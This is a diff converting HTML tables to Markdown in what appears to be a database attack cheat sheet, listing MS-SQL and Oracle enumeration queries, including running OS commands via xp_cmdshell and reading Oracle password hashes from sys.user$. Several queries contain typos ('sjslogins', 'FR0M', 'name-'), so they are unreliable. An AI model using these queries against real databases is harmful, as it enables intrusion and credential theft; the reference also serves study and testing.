@@ -9,65 +9,22 @@ folder: mydoc
 
 Ms-sql
 
-<table>
-   <thead>
-     <tr>
-       <th style="text-align:left"><b>Command</b>
-       </th>
-       <th style="text-align:left"><b>Description</b>
-       </th>
-     </tr>
-   </thead>
-   <tbody>
-     <tr>
-       <td style="text-align:left">SELECT @@version</td>
-       <td style="text-align:left">Database version</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">EXEC xp_msver</td>
-       <td style="text-align:left">version details</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">EXEC master..xp_cmdshell &apos;net user&apos;</td>
-       <td style="text-align:left">Run operating system command</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT HOST_NAME()</td>
-       <td style="text-align:left">Get Hostname and IP</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT DB_NAME()</td>
-       <td style="text-align:left">Current database</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT name FROM master..sysdatabases;</td>
-       <td style="text-align:left">List of databases</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT user name()</td>
-       <td style="text-align:left">Current user</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT name FROM master .. sjslogins</td>
-       <td style="text-align:left">List of users</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">
-         <p>SELECT name FROM master..sysobjects WHERE</p>
-         <p>xtype= &apos;U&apos;;</p>
-       </td>
-       <td style="text-align:left">list of tables</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">
-         <p>
-         <p>SELECT name FROM syscolumns WHERE id=(SELECT</p>
-         <p>id FR0M sysobjects WHERE name- &apos;mjtable&apos; ) ;</p>
-       </td>
-       <td style="text-align:left">List of columns</td>
-     </tr>
-   </tbody>
-</table>
+
+| **Command** | **Description** |
+| :--- | :--- |
+| SELECT @@version      | Database version             
+| EXEC xp_msver         | version details              
+| EXEC master..xp_cmdshell &apos;net user&apos;   | Run operating system command 
+| SELECT HOST_NAME()               | Get Hostname and IP       
+| SELECT DB_NAME()       | Current database        
+| SELECT name FROM master..sysdatabases;        | List of databases            
+| SELECT user name()      | Current user                
+| SELECT name FROM master .. sjslogins    | List of users               
+|     SELECT name FROM master..sysobjects WHERE xtype= &apos;U&apos;;    | list of tables               
+|  SELECT name FROM syscolumns WHERE id=(SELECT id FR0M sysobjects WHERE name- &apos;mjtable&apos; ) ; | List of columns              
+
+
+
 
 ### Information about all database tables in the system table
 
@@ -167,61 +124,21 @@ SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
 
 ## Oracle
 
-<table>
-   <thead>
-     <tr>
-       <th style="text-align:left"><b>Command</b>
-       </th>
-       <th style="text-align:left"><b>Description</b>
-       </th>
-     </tr>
-   </thead>
-   <tbody>
-     <tr>
-       <td style="text-align:left">SELECT * FROM v$version;</td>
-       <td style="text-align:left">Database version</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT version FROM v$instance;</td>
-       <td style="text-align:left">Database version</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT instance name FROM v$instance;</td>
-       <td style="text-align:left">Current database</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT name FROM v$database;</td>
-       <td style="text-align:left">Current database</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT DISTINCT owner FROM all_tables;</td>
-       <td style="text-align:left">List of databases</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT user FROM dual;</td>
-       <td style="text-align:left">Current user</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">
-         <p>SELECT username FROM all_users ORDER BY</p>
-         <p>username;</p>
-       </td>
-       <td style="text-align:left">List of users</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT column name FROM all_tab_columns;</td>
-       <td style="text-align:left">List of columns</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT table name FROM all_tables;</td>
-       <td style="text-align:left">list of tables</td>
-     </tr>
-     <tr>
-       <td style="text-align:left">SELECT name, password, astatus FROM sys.user$;</td>
-       <td style="text-align:left">List of password hashes</td>
-     </tr>
-   </tbody>
-</table>
+
+| **Command** | **Explanation** |
+| :--- | :--- |
+| SELECT * FROM v$version; | Database version
+| SELECT version FROM v$instance; | Database version
+| SELECT instance name FROM v$instance; | Current database |
+| SELECT name FROM v$database; | Current database
+| SELECT DISTINCT owner FROM all_tables; | List of databases
+| SELECT user FROM dual; | Current user
+| SELECT username FROM all_users ORDER BY username; | List of users
+| SELECT column name FROM all_tab_columns; | List of columns
+| SELECT table name FROM all_tables; | list of tables
+| SELECT name, password, astatus FROM sys.user$; | List of password hashes
+
+
 
 ### List of databases
 
